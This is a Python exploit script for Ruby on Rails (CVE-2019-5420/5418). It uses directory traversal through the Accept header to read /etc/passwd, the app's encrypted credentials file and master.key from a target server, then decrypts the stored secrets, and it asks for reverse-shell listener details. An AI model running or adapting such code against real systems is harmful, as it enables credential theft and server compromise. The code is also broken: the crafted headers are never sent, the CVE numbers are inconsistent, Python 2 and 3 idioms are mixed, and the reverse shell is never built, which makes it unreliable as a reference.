import argparse
import requests
import base64
import sys
from log_colors import *
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import (
    Cipher, algorithms, modes
)

requests.packages.urllib3.disable_warnings()

# CVE-2019-5420
# Rails <5.2.2.1, <6.0.0.beta3 RCE.
class CVE2019_5420:
    headers = {"User-Agent" : "Mozilla/5.0"}

    def __init__(self, url, path, lhost, lport):
        print (LogColors.BLUE + "victim: " + url  + "..." + LogColors.ENDC)
        self.url = url.rstrip("/")
        self.path = path.strip("/")
        self.lhost, self.lport = lhost, lport
        self.session = requests.Session()

    # check is vulnerable 
    def is_vuln(self):
        print (LogColors.BLUE + "checking if vulnerable to CVE-2019-5418..." + LogColors.ENDC)
        headers = {"Accept" : "../../../../../../../../../../etc/passwd{{"}
        r = self.session.get(self.url + "/" + self.path)
        if r.ok and "root:x:0:0:root:" in r.text:
            print (LogColors.YELLOW + "vulnerable to CVE-2018-5418..." + LogColors.ENDC)
        else:
            print (LogColors.RED + "maybe not vulnerable to CVE-2019-5418" + LogColors.ENDC)
            sys.exit()

    # get credentials.yml.enc file
    def get_credentials(self):
        print (LogColors.BLUE + "get file credentials.yml.enc..." + LogColors.ENDC)
        filepath = "../../../../../../../../../../config/credentials.yml.enc{{"
        headers = {"Accept" : filepath[3:]}
        r = self.session.get(self.url + "/" + self.path)
        if r.ok:
            with open("credentials.yml.enc", "w+") as fp:
                fp.write(r.text)
                self.cred = r.text
                print (LogColors.GREEN + "successfully get credentials file :)" + LogColors.ENDC)
        else:
            print (LogColors.RED + "failed get credentials file :(" + LogColors.ENDC)
            sys.exit()

    # get master.key file
    def get_master_key(self):
        print (LogColors.BLUE + "get file master.key..." + LogColors.ENDC)
        filepath = "../../../../../../../../../../config/master.key{{"
        headers = {"Accept" : filepath[3:]}
        r = self.session.get(self.url + "/" + self.path)
        if r.ok:
            with open("master.key", "w+") as fp:
                fp.write(r.text)
                self.master = r.text
                print (LogColors.GREEN + "successfully get master.key file :)" + LogColors.ENDC)
        else:
            print (LogColors.RED + "failed get master.key file :(" + LogColors.ENDC)
            sys.exit()

    # decode credentials
    def decode_cred(self):
        print (LogColors.BLUE + "decode credentials.yml.enc..." + LogColors.ENDC)
        separator = "--"
        ciphertext_b64, iv_b64, tag_b64 = self.cred.split(separator)
        ciphertext = base64.b64decode(ciphertext_b64)
        iv = base64.b64decode(iv_b64)
        tag = base64.b64decode(tag_b64)
        return (ciphertext, iv, tag)

    # decode master key
    def decode_master(self):
        print (LogColors.BLUE + "decode master.key..." + LogColors.ENDC)
        return self.master.decode("hex")

    # decrypt
    # construct a Cipher object, with the key, iv, and 
    # additionally the
    # GCM tag used for authenticating the message.
    def decrypt(self, key, ciphertext, iv, tag):
        print (LogColors.BLUE + "decrypt..." + LogColors.ENDC)
        decryptor = Cipher(
            algorithms.AES(key),
            modes.GCM(iv, tag),
            backend=default_backend()
        ).decryptor()
        try:
            decrypted = decryptor.update(ciphertext) + decryptor.finalize()
            print (LogColors.GREEN + "successfully decrypt :)" + LogColors)
            return decrypted
        except Exception:
            print (LogColors.RED + "failed to decrypt :(" + LogColors.ENDC)
            sys.exit()
    
    # encrypt - for re encrypt with tampered session
    def encrypt(self, key, plaintext, iv):
        print (LogColors.BLUE + "encrypt..." + LogColors.ENDC)
        #iv = os.random(12)
        encryptor = Cipher(
            algorithms.AES(key),
            modes.GCM(iv),
            backend=default_backend()
        ).encryptor()

        try:
            ciphertext = encryptor.update(plaintext) + encryptor.finalize()
            print (LogColors.GREEN + "successfully encrypt :)" + LogColors.ENDC)
            return (iv, ciphertext, encryptor.tag)
        except Exception:
            print (LogColors.RED + "failed to encrypt :(" + LogColors.ENDC)
            sys.exit()

    # exploitation logic
    def exploit(self):
        self.is_vuln()
        self.get_credentials()
        self.get_master_key()
        ciphertext, iv, tag = self.decode_cred()
        master = self.decode_master()
        print (self.decrypt(master, ciphertext, iv, tag))

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url', required = True, help = "target url")
    parser.add_argument('-P','--path', required = True, help = "target path")
    parser.add_argument('-i','--ip', required = True, help = "revshell listener ip")
    parser.add_argument('-p','--port', required = True, help = "revshell listener port")
    args = vars(parser.parse_args())
    url = args['url']
    path = args['path']
    ip, port = args['ip'], args['port']
    cve = CVE2019_5420(url, path, ip, port)
    cve.exploit()

